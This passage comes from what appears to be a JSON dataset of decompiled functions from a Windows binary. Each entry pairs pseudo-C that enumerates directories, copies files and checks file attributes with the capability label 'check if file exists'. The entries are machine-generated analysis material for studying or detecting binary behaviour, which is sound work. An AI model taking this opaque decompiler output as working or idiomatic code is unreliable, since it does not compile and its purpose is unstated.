fcn.004168c0(&var_108h, arg_8h, arg_10h, arg_14h);\n                                }\n                            }\n                            else if ((var_34ch & 0x10) == 0) goto code_r0x00416e82;\n                        }\n                    }\n                }\n                fcn.00416cb0(arg_8h_00, arg_ch_00, arg_10h_00, arg_14h_00, unaff_EDI);\n            }\ncode_r0x00416e82:\n            iVar2 = (**0x469170)(iVar1, &var_34ch);\n        } while (iVar2 != 0);\n        (**0x4690e0)(iVar1);\n    }\n    fcn.0042ad2a(unaff_ESI);\n    return;\n}\n",
        "token_count": 813
    },
    "00416ec0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00416ec0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    uint unaff_ESI;\n    uint var_94ch;\n    uint var_948h;\n    uint var_944h;\n    uint var_93ch;\n    uint var_910h;\n    uint var_7fch;\n    uint var_414h;\n    uint var_310h;\n    uint var_20ch;\n    uint var_108h;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    (**0x4690ac)(&var_414h, 0x446f98, arg_ch);\n    iVar1 = (**0x469318)(&var_414h, &var_93ch);\n    if (iVar1 != -1) {\n        do {\n            iVar2 = (**0x469288)(&var_910h, 0x446e5c);\n            if ((iVar2 != 0) && (iVar2 = (**0x469288)(&var_910h, 0x446e58),  iVar2 != 0)) {\n                (**0x4690ac)(&var_310h, 0x446e60, arg_ch, &var_910h);\n                iVar2 = (**0x469288)(arg_8h, 0x4453cc);\n                if (iVar2 == 0) {\n                    (**0x4690ac)(&var_20ch, 0x446fd8, &var_910h);\n                }\n                else {\n                    (**0x4690ac)(&var_20ch, 0x446e60, arg_8h, &var_910h);\n                }\n                iVar2 = (**0x469154)(&var_910h, arg_10h);\n                if (iVar2 != 0) {\n                    fcn.0042acb0(&var_7fch, 0, 1000);\n                    (**0x469258)(&var_7fch, 0x447478);\n                    (**0x469258)(&var_7fch, arg_14h);\n                    (**0x469258)(&var_7fch, 0x445418);\n                    (**0x469258)(&var_7fch, &var_20ch);\n                    fcn.0042acb0(&var_108h, 0, 0x104);\n                    (**0x469258)(&var_108h, *0x458374);\n                    uVar3 = fcn.00420ef0(0x1a);\n                    (**0x469258)(&var_108h, uVar3);\n                    (**0x469100)(&var_310h, &var_108h, 1);\n                    fcn.00429f90(*(in_ECX + 0x20), &var_7fch, &var_108h);\n                    (**0x46915c)(&var_108h);\n                }\n                fcn.00416ec0(&var_20ch, &var_310h, arg_10h, arg_14h);\n            }\n            iVar2 = (**0x469170)(iVar1, &var_93ch);\n        } while (iVar2 != 0);\n        (**0x4690e0)(iVar1);\n    }\n    fcn.0042ad2a(unaff_ESI);\n    return;\n}\n",
        "token_count": 790
    },
    "00418840": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00418840(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    iVar1 = **(in_ECX + 0x38);\n    *arg_8h = iVar1;\n    fcn.0042a3db(0);\n    if (*(iVar1 + 4) != -1) {\n        *(iVar1 + 4) = *(iVar1 + 4) + 1;\n    }\n    fcn.0042a403();\n    return arg_8h;\n}\n",
        "token_count": 136
    },
    "00418b50": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00418b50(int32_t param_1)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    *(param_1 + 0x30) = 0;\n    *(param_1 + 8) = 0;\n    *(param_1 + 0x10) = 0;\n    *(param_1 + 0x14) = 0x201;\n    *(param_1 + 0x18) = 6;\n    *(param_1 + 0x1c) = 0;\n    *(param_1 + 0x20) = 0;\n    *(param_1 + 0x24) = 0;\n    *(param_1 + 0x28) = 0;\n    *(param_1 + 0x2c) = 0;\n    fcn.00418a20(0, 0);\n    puVar1 = fcn.0042b9b1(4);\n    if (puVar1 != NULL) {\n        uVar2 = fcn.0042a6e7();\n        *puVar1 = uVar2;\n        iVar3 = fcn.0042a4a6();\n        fcn.0042a3db(0);\n        if (*(iVar3 + 4) != -1) {\n            *(iVar3 + 4) = *(iVar3 + 4) + 1;\n        }\n        fcn.0042a403();\n        *(param_1 + 0x30) = puVar1;\n        return;\n    }\n    *(param_1 + 0x30) = 0;\n    return;\n}\n",
        "token_count": 383
    },
    "00418c30": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00418c30(uint *param_1)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar1 = param_1[0xe];\n    *param_1 = 0x4479c4;\n    if (puVar1 != NULL) {\n        uVar2 = *puVar1;\n        if (uVar2 != 0) {\n            fcn.0042a3db(0);\n            iVar3 = *(uVar2 + 4);\n            if ((iVar3 != 0) && (iVar3 != -1)) {\n                *(uVar2 + 4) = iVar3 + -1;\n            }\n            iVar3 = *(uVar2 + 4);\n            fcn.0042a403();\n            puVar4 = ~-(iVar3 != 0) & uVar2;\n            if (puVar4 != NULL) {\n                (***puVar4)(1);\n            }\n        }\n        fcn.0042ac49(puVar1);\n    }\n    fcn.0042aa43();\n    return;\n}\n",
        "token_count": 271
    },
    "004194a0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.004194a0(uint *param_1)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43ea1b;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    *param_1 = 0x4479c4;\n    fcn.0042aa29(uVar1);\n    var_4h = 0;\n    puVar2 = fcn.0042b9b1(4);\n    if (puVar2 == NULL) {\n        puVar2 = NULL;\n    }\n    else {\n        uVar3 = fcn.0042a6e7();\n        *puVar2 = uVar3;\n        iVar4 = fcn.0042a4a6();\n        fcn.0042a3db(0);\n        if (*(iVar4 + 4) != -1) {\n            *(iVar4 + 4) = *(iVar4 + 4) + 1;\n        }\n        fcn.0042a403();\n    }\n    param_1[4] = param_1 + 2;\n    param_1[8] = param_1 + 6;\n    param_1[9] = param_1 + 7;\n    param_1[0xe] = puVar2;\n    param_1[5] = param_1 + 3;\n    param_1[0xc] = param_1 + 10;\n    param_1[0xd] = param_1 + 0xb;\n    param_1[3] = 0;\n    *param_1[9] = 0;\n    *param_1[0xd] = 0;\n    *param_1[4] = 0;\n    *param_1[8] = 0;\n    *param_1[0xc] = 0;\n    *in_FS_OFFSET = var_ch;\n    return param_1;\n}\n",
        "token_count": 517
    },
    "00419970": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00419970(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = fcn.0042dcf2(arg_8h, arg_ch);\n    return uVar1 & 0xffffff00 | uVar1 != 0xffffffff;\n}\n",
        "token_count": 73
    },
    "00419b60": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00419b60(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    uint *puVar5;\n    int32_t *in_FS_OFFSET;\n    uint var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43eaa8;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    puVar5 = &var_10h;\n    uVar3 = fcn.00415720(puVar5);\n    var_4h = 0;\n    piVar4 = fcn.00419590(uVar3);\n    var_4h = 0xffffffff;\n    if (var_10h != 0) {\n        uVar3 = 0;\n        fcn.0042a3db(0);\n        iVar1 = *(var_10h + 4);\n        if ((iVar1 != 0) && (iVar1 != -1)) {\n            *(var_10h + 4) = iVar1 + -1;\n        }\n        iVar1 = *(var_10h + 4);\n        fcn.0042a403(uVar3, puVar5, uVar2);\n        puVar5 = ~-(iVar1 != 0) & var_10h;\n        if (puVar5 != NULL) {\n            (***puVar5)(1);\n        }\n    }\n    (**(*piVar4 + 0x18))(arg_8h);\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 408
    },
    "0041a3a0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_40h\n\nvoid __cdecl fcn.0041a3a0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint *arg_8h_00;\n    int32_t iVar5;\n    int32_t *in_FS_OFFSET;\n    uint var_40h;\n    uint var_3ch;\n    uint32_t var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint *var_2ch;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43eb98;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_10h = uVar2;\n    iVar3 = fcn.004158e0(arg_8h, &var_30h, &var_34h);\n    if (iVar3 != 0) {\n        iVar3 = fcn.00420ea0(var_30h, var_34h);\n        if (iVar3 != 0) {\n            iVar3 = (**0x4690d8)(iVar3, 0x447a84, uVar2);\n            if (iVar3 != 0) {\n                var_18h = 0xf;\n                var_1ch = 0;\n                var_2ch = var_2ch & 0xffffff00;\n                uVar4 = fcn.0042b420(iVar3 + 0x10);\n                fcn.00406270(iVar3 + 0x10, uVar4);\n                var_4h = 0;\n                uVar4 = fcn.0042b420(0x447a80);\n                iVar3 = fcn.0040b910(0x447a80, 0, uVar4);\n                if (iVar3 != -1) {\n                    fcn.00405a90(iVar3, 0xffffffff);\n                }\n                arg_8h_00 = var_2ch;\n                if (var_18h < 0x10) {\n                    arg_8h_00 = &var_2ch;\n                }\n                iVar5 = fcn.00415980(arg_8h_00, &var_30h, &var_38h);\n                iVar3 = var_30h;\n                if ((iVar5 != 0) && (4 < var_38h)) {\n                    iVar5 = fcn.0042c233(var_30h, 0x4473ac, 5);\n                    if (iVar5 == 0) {\n                        cVar1 = fcn.00415a00(iVar3 + 5, var_38h - 5, &var_34h, &var_30h);\n                        if ((cVar1 != '\\0') && (var_30h == 0x20)) {\n                            fcn.00415ad0(var_34h, arg_ch, arg_10h);\n                        }\n                    }\n                }\n                if (0xf < var_18h) {\n                    fcn.0042ac49(var_2ch);\n                }\n            }\n        }\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042ad2a(arg_ch);\n    return;\n}\n",
        "token_count": 805
    },
    "0041d420": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_5a4h_2\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0041d420(uint param_1)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint uVar10;\n    uchar *noname_5;\n    int32_t iVar11;\n    uint *puVar12;\n    uint *puVar13;\n    int32_t **in_FS_OFFSET;\n    bool bVar14;\n    uint var_5a4h;\n    uint var_53ch;\n    uint var_4f4h;\n    uint var_4ech;\n    uint var_4e8h;\n    uint var_4e4h;\n    uint var_4e0h;\n    uint var_4d9h;\n    uint var_4bch;\n    uint var_4ach;\n    uint var_4a8h;\n    uint var_4a0h;\n    uint var_490h;\n    uint var_48ch;\n    uint var_484h;\n    uint var_474h;\n    uint var_470h;\n    uint var_468h;\n    uint var_458h;\n    uint var_454h;\n    uint var_44ch;\n    uint var_43ch;\n    uint var_438h;\n    uint var_430h;\n    uint var_420h;\n    uint var_41ch;\n    uint var_414h;\n    uint var_404h;\n    uint var_400h;\n    uint var_3f8h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    uchar *arg_8h;\n    uint var_5a4h_2;\n    uint in_stack_fffffaf4;\n    uint var_4f4h_2;\n    uint var_4f0h;\n    uint32_t uStack1264;\n    uint uStack1260;\n    uint32_t var_4e4h_2;\n    int32_t var_4e0h_2;\n    uint var_4d8h;\n    uint32_t var_4c4h;\n    uint32_t auStack1216 [4];\n    uint uStack1200;\n    uint32_t uStack1196;\n    uint32_t auStack1188 [4];\n    uint uStack1172;\n    uint32_t uStack1168;\n    uint *var_484h_2;\n    uint32_t var_474h_2;\n    uint32_t uStack1140;\n    uint *var_468h_2;\n    uint32_t uStack1116;\n    uint32_t uStack1112;\n    uint *var_44ch_2;\n    uint32_t uStack1088;\n    uint32_t uStack1084;\n    uint *var_430h_2;\n    uint32_t var_420h_2;\n    uint32_t var_41ch_2;\n    uint *var_414h_2;\n    int32_t var_404h_2;\n    uint32_t var_400h_2;\n    uchar auStack1020 [1000];\n    uint32_t uStack20;\n    int32_t *piStack16;\n    uint uStack12;\n    uint var_4h_2;\n    \n    var_4h_2 = 0xffffffff;\n    uStack12 = 0x43ef7e;\n    piStack16 = *in_FS_OFFSET;\n    uStack20 = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &piStack16;\n    uStack1260 = param_1;\n    fcn.0042acb0();\n    fcn.00421020(0x28);\n    (**0x469258)();\n    noname_5 = auStack1020;\n    uVar10 = *0x457ea8;\n    (**0x469258)();\n    arg_8h = auStack1020;\n    iVar2 = fcn.00420f90(arg_8h);\n    if (iVar2 != 0) {\n        fcn.0041d0e0(auStack1020, 1, 0x40, 1);\n        var_400h_2 = 0xf;\n        var_404h_2 = 0;\n        var_414h_2 = var_414h_2 & 0xffffff00;\n        var_4e0h_2 = 0;\n        uStack1140 = 0xf;\n        var_474h_2 = 0;\n        var_484h_2 = var_484h_2 & 0xffffff00;\n        uStack1112 = 0xf;\n        uStack1116 = 0;\n        var_468h_2 = var_468h_2 & 0xffffff00;\n        uStack1084 = 0xf;\n        uStack1088 = 0;\n        var_44ch_2 = var_44ch_2 & 0xffffff00;\n        var_41ch_2 = 0xf;\n        var_420h_2 = 0;\n        var_430h_2 = var_430h_2 & 0xffffff00;\n        var_4h_2._0_1_ = 5;\n        var_4h_2._1_3_ = 0;\n        while( true ) {\n            uVar3 = fcn.00415720(&uStack1264);\n            var_4h_2._0_1_ = 6;\n            piVar4 = fcn.00419590(uVar3);\n            uVar8 = uStack1264;\n            var_4h_2._0_1_ = 5;\n            if (uStack1264 != 0) {\n                fcn.0042a3db(0);\n                iVar2 = *(uVar8 + 4);\n                if ((iVar2 != 0) && (iVar2 != -1)) {\n                    *(uVar8 + 4) = iVar2 + -1;\n                }\n                iVar2 = *(uVar8 + 4);\n                fcn.0042a403();\n                puVar13 = ~-(iVar2 != 0) & uVar8;\n                if (puVar13 != NULL) {\n                    (***puVar13)(1);\n                }\n            }\n            uVar1 = (**(*piVar4 + 0x18))(10);\n            var_4e4h_2 = var_4e4h_2 & 0xffffff00 | uVar1;\n            piVar4 = fcn.0041a1e0();\n            uVar3 = *0x457df8;\n            if ((*(*piVar4 + 4) + piVar4 & ~-((*(*(*piVar4 + 4) + 0xc + piVar4) & 6) != 0)) == 0) break;\n            uVar5 = fcn.0042b420();\n            iVar2 = fcn.0040b910(uVar3, var_4e0h_2 + 1, uVar5);\n            if (iVar2 != -1) {\n                fcn.00405a90(0, 9);\n                puVar13 = var_414h_2;\n                if (var_400h_2 < 0x10) {\n                    puVar13 = &var_414h_2;\n                }\n                puVar12 = var_414h_2;\n                if (var_400h_2 < 0x10) {\n                    puVar12 = &var_414h_2;\n                }\n                iVar11 = puVar12 + var_404h_2 + -7;\n                puVar12 = var_414h_2;\n                if (var_400h_2 < 0x10) {\n                    puVar12 = &var_414h_2;\n                }\n                if (iVar11 == 0) {\n                    iVar6 = 0;\n                }\n                else {\n                    iVar6 = iVar11 - puVar12;\n                }\n                if (puVar13 + var_404h_2 == 0) {\n                    iVar11 = 0;\n                }\n                else {\n                    iVar11 = (puVar13 + var_404h_2) - iVar11;\n                }\n                fcn.00405a90(iVar6, iVar11);\n                fcn.00406180(&var_414h_2, 0, 0xffffffff);\n            }\n            uVar3 = *0x4580e0;\n            uVar5 = fcn.0042b420();\n            iVar2 = fcn.0040b910(uVar3, iVar2 + 1, uVar5);\n            if (iVar2 != -1) {\n                fcn.00405a90(0, 9);\n                puVar13 = var_414h_2;\n                if (var_400h_2 < 0x10) {\n                    puVar13 = &var_414h_2;\n                }\n                puVar12 = var_414h_2;\n                if (var_400h_2 < 0x10) {\n                    puVar12 = &var_414h_2;\n                }\n                iVar11 = var_404h_2 + -7 + puVar12;\n                puVar12 = var_414h_2;\n                if (var_400h_2 < 0x10) {\n                    puVar12 = &var_414h_2;\n                }\n                if (iVar11 == 0) {\n                    iVar6 = 0;\n                }\n                else {\n                    iVar6 = iVar11 - puVar12;\n                }\n                if (var_404h_2 + puVar13 == 0) {\n                    iVar11 = 0;\n                }\n                else {\n                    iVar11 = (var_404h_2 + puVar13) - iVar11;\n                }\n                fcn.00405a90(iVar6, iVar11);\n                fcn.00406180(&var_414h_2, 0, 0xffffffff);\n            }\n            uVar3 = *0x458274;\n            uVar5 = fcn.0042b420();\n            iVar2 = fcn.0040b910(uVar3, iVar2 + 1, uVar5);\n            if (iVar2 != -1) {\n                fcn.00405a90(0, 9);\n                puVar13 = var_414h_2;\n                if (var_400h_2 < 0x10) {\n                    puVar13 = &var_414h_2;\n                }\n                puVar12 = var_414h_2;\n                if (var_400h_2 < 0x10) {\n                    puVar12 = &var_414h_2;\n                }\n                iVar11 = puVar12 + var_404h_2 + -7;\n                puVar12 = var_414h_2;\n                if (var_400h_2 < 0x10) {\n                    puVar12 = &var_414h_2;\n                }\n                if (iVar11 == 0) {\n                    iVar6 = 0;\n                }\n                else {\n                    iVar6 = iVar11 - puVar12;\n                }\n                if (puVar13 + var_404h_2 == 0) {\n                    iVar11 = 0;\n                }\n                else {\n                    iVar11 = (puVar13 + var_404h_2) - iVar11;\n                }\n                fcn.00405a90(iVar6, iVar11);\n                fcn.00406180(&var_414h_2, 0, 0xffffffff);\n            }\n            uVar3 = *0x4582b8;\n            uVar5 = fcn.0042b420();\n            var_4e0h_2 = fcn.0040b910(uVar3, iVar2 + 1, uVar5);\n            if (var_4e0h_2 != -1) {\n                fcn.00405a90(0, 0x1b);\n                puVar13 = var_414h_2;\n                if (var_400h_2 < 0x10) {\n                    puVar13 = &var_414h_2;\n                }\n                iVar2 = puVar13 + var_404h_2;\n                puVar13 = var_414h_2;\n                if (var_400h_2 < 0x10) {\n                    puVar13 = &var_414h_2;\n                }\n                iVar11 = puVar13 + var_404h_2 + -7;\n                puVar13 = var_414h_2;\n                if (var_400h_2 < 0x10) {\n                    puVar13 = &var_414h_2;\n                }\n                if (iVar11 == 0) {\n                    iVar6 = 0;\n                }\n                else {\n                    iVar6 = iVar11 - puVar13;\n                }\n                if (iVar2 != 0) {\n                    iVar2 = iVar2 - iVar11;\n                }\n                fcn.00405a90(iVar6, iVar2);\n                uVar5 = 0xffffffff;\n                uVar3 = 0;\n                puVar13 = &var_414h_2;\n                arg_8h = arg_8h & 0xffffff00;\n                fcn.00406180(puVar13, 0, 0xffffffff);\n                piVar4 = fcn.00423e30(&var_4d8h, puVar13, uVar3, uVar5, arg_8h, noname_5, uVar10);\n                if (&var_430h_2 != piVar4) {\n                    if (0xf < var_41ch_2) {\n                        fcn.0042ac49(var_430h_2);\n                    }\n                    var_41ch_2 = 0xf;\n                    var_420h_2 = 0;\n                    var_430h_2 = var_430h_2 & 0xffffff00;\n                    if (piVar4[5] < 0x10) {\n                        fcn.0042b4b0(&var_430h_2, piVar4, piVar4[4] + 1);\n                    }\n                    else {\n                        var_430h_2 = *piVar4;\n                        *piVar4 = 0;\n                    }\n                    var_420h_2 = piVar4[4];\n                    var_41ch_2 = piVar4[5];\n                    piVar4[4] = 0;\n                    piVar4[5] = 0;\n                }\n                var_4h_2._0_1_ = 5;\n                if (0xf < var_4c4h) {\n                    fcn.0042ac49(var_4d8h);\n                }\n            }\n            uVar7 = fcn.0042b420(0x4453cc);\n            uVar8 = var_474h_2;\n            uVar9 = var_474h_2;\n            if (uVar7 <= var_474h_2) {\n                uVar9 = uVar7;\n            }\n            puVar13 = var_484h_2;\n            if (uStack1140 < 0x10) {\n                puVar13 = &var_484h_2;\n            }\n            iVar2 = fcn.0042c233(puVar13, 0x4453cc, uVar9);\n            bVar14 = iVar2 == 0;\n            if (bVar14) {\n                if (uVar8 < uVar7) {\n                    uVar8 = 0xffffffff;\n                }\n                else {\n                    uVar8 = uVar8 != uVar7;\n                }\n                bVar14 = uVar8 == 0;\n            }\n            if (!bVar14) {\n                uVar7 = fcn.0042b420(0x4453cc);\n                uVar8 = uStack1116;\n                uVar9 = uStack1116;\n                if (uVar7 <= uStack1116) {\n                    uVar9 = uVar7;\n                }\n                puVar13 = var_468h_2;\n                if (uStack1112 < 0x10) {\n                    puVar13 = &var_468h_2;\n                }\n                iVar2 = fcn.0042c233(puVar13, 0x4453cc, uVar9);\n                bVar14 = iVar2 == 0;\n                if (bVar14) {\n                    if (uVar8 < uVar7) {\n                        uVar8 = 0xffffffff;\n                    }\n                    else {\n                        uVar8 = uVar8 != uVar7;\n                    }\n                    bVar14 = uVar8 == 0;\n                }\n                if (!bVar14) {\n                    uVar7 = fcn.0042b420(0x4453cc);\n                    uVar8 = uStack1088;\n                    uVar9 = uStack1088;\n                    if (uVar7 <= uStack1088) {\n                        uVar9 = uVar7;\n                    }\n                    puVar13 = var_44ch_2;\n                    if (uStack1084 < 0x10) {\n                        puVar13 = &var_44ch_2;\n                    }\n                    iVar2 = fcn.0042c233(puVar13, 0x4453cc, uVar9);\n                    bVar14 = iVar2 == 0;\n                    if (bVar14) {\n                        if (uVar8 < uVar7) {\n                            uVar8 = 0xffffffff;\n                        }\n                        else {\n                            uVar8 = uVar8 != uVar7;\n                        }\n                        bVar14 = uVar8 == 0;\n                    }\n                    if (!bVar14) {\n                        uVar7 = fcn.0042b420(0x4453cc);\n                        uVar8 = var_420h_2;\n                        uVar9 = var_420h_2;\n                        if (uVar7 <= var_420h_2) {\n                            uVar9 = uVar7;\n                        }\n                        puVar13 = var_430h_2;\n                        if (var_41ch_2 < 0x10) {\n                            puVar13 = &var_430h_2;\n                        }\n                        iVar2 = fcn.0042c233(puVar13, 0x4453cc, uVar9);\n                        uVar3 = uStack1260;\n                        bVar14 = iVar2 == 0;\n                        if (bVar14) {\n                            if (uVar8 < uVar7) {\n                                uVar8 = 0xffffffff;\n                            }\n                            else {\n                                uVar8 = uVar8 != uVar7;\n                            }\n                            bVar14 = uVar8 == 0;\n                        }\n                        if (!bVar14) {\n                            (**0x469258)(uStack1260, *0x458504);\n                            (**0x469258)(uVar3, *0x4584bc);\n                            uVar10 = fcn.0040e700(auStack1188, &var_484h_2, 0x446fd4);\n                            var_4h_2._0_1_ = 8;\n                            puVar13 = fcn.00412f10(auStack1216, uVar10, &var_468h_2);\n                            var_4h_2 = CONCAT31(var_4h_2._1_3_, 9);\n                            if (0xf < puVar13[5]) {\n                                puVar13 = *puVar13;\n                            }\n                            (**0x469258)(uVar3, puVar13);\n                            if (0xf < uStack1196) {\n                                fcn.0042ac49(auStack1216[0]);\n                            }\n                            uStack1196 = 0xf;\n                            uStack1200 = 0;\n                            auStack1216[0] = auStack1216[0] & 0xffffff00;\n                            var_4h_2._0_1_ = 5;\n                            if (0xf < uStack1168) {\n                                fcn.0042ac49(auStack1188[0]);\n                            }\n                            uStack1168 = 0xf;\n                            uStack1172 = 0;\n                            auStack1188[0] = auStack1188[0] & 0xffffff00;\n                            (**0x469258)(uVar3, 0x44540c);\n                            (**0x469258)(uVar3, *0x457f78);\n                            puVar13 = var_44ch_2;\n                            if (uStack1084 < 0x10) {\n                                puVar13 = &var_44ch_2;\n                            }\n                            (**0x469258)(uVar3, puVar13);\n                            (**0x469258)(uVar3, 0x44540c);\n                            (**0x469258)(uVar3, *0x458478);\n                            puVar13 = var_430h_2;\n                            if (var_41ch_2 < 0x10) {\n                                puVar13 = &var_430h_2;\n                            }\n                            (**0x469258)(uVar3, puVar13);\n                            (**0x469258)(uVar3, 0x447030);\n                            uVar3 = fcn.0042b420();\n                            uVar10 = 0x4453cc;\n                            fcn.00406270(0x4453cc, uVar3);\n                            noname_5 = fcn.0042b420();\n                            arg_8h = 0x4453cc;\n                            fcn.00406270(0x4453cc, noname_5);\n                            uVar3 = fcn.0042b420(0x4453cc);\n                            fcn.00406270(0x4453cc, uVar3);\n                            uVar3 = fcn.0042b420(0x4453cc);\n                            fcn.00406270(0x4453cc, uVar3);\n                            *0x45879c = *0x45879c + 1;\n                        }\n                    }\n                }\n            }\n        }\n        if (0xf < var_41ch_2) {\n            fcn.0042ac49();\n        }\n        var_41ch_2 = 0xf;\n        var_420h_2 = 0;\n        var_430h_2 = var_430h_2 & 0xffffff00;\n        if (0xf < uStack1084) {\n            fcn.0042ac49();\n        }\n        uStack1084 = 0xf;\n        uStack1088 = 0;\n        var_44ch_2 = var_44ch_2 & 0xffffff00;\n        if (0xf < uStack1112) {\n            fcn.0042ac49();\n        }\n        uStack1112 = 0xf;\n        uStack1116 = 0;\n        var_468h_2 = var_468h_2 & 0xffffff00;\n        if (0xf < uStack1140) {\n            fcn.0042ac49();\n        }\n        uStack1140 = 0xf;\n        var_474h_2 = 0;\n        var_484h_2 = var_484h_2 & 0xffffff00;\n        if (0xf < var_400h_2) {\n            fcn.0042ac49();\n        }\n        var_400h_2 = 0xf;\n        var_404h_2 = 0;\n        var_414h_2 = var_414h_2 & 0xffffff00;\n        var_4h_2 = 0xffffffff;\n        fcn.0041d250();\n        fcn.0042a8d9(&stack0xfffffac0);\n    }\n    *in_FS_OFFSET = piStack16;\n    fcn.0042ad2a(in_stack_fffffaf4);\n    return;\n}\n",
        "token_count": 5287
    },
    "00420f60": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00420f60(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = (**0x46909c)(arg_8h);\n    if ((uVar1 != 0xffffffff) && ((uVar1 & 0x10) == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 84
    },
    "00420f90": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00420f90(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = (**0x4691a8)(arg_8h);\n    if ((uVar1 != 0xffffffff) && ((uVar1 & 0x10) == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 85
    },
    "00420fc0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong __cdecl fcn.00420fc0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = (**0x4690ec)(arg_8h, 0x80000000, 3, 0, 3, 0x80, 0);\n    if (iVar1 != -1) {\n        iVar2 = (**0x4690a4)(iVar1, &var_8h);\n        if (iVar2 != 0) {\n            (**0x4690f0)(iVar1);\n            return _var_8h;\n        }\n        (**0x4690f0)();\n    }\n    return 0;\n}\n",
        "token_count": 167
    },
    "00421130": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
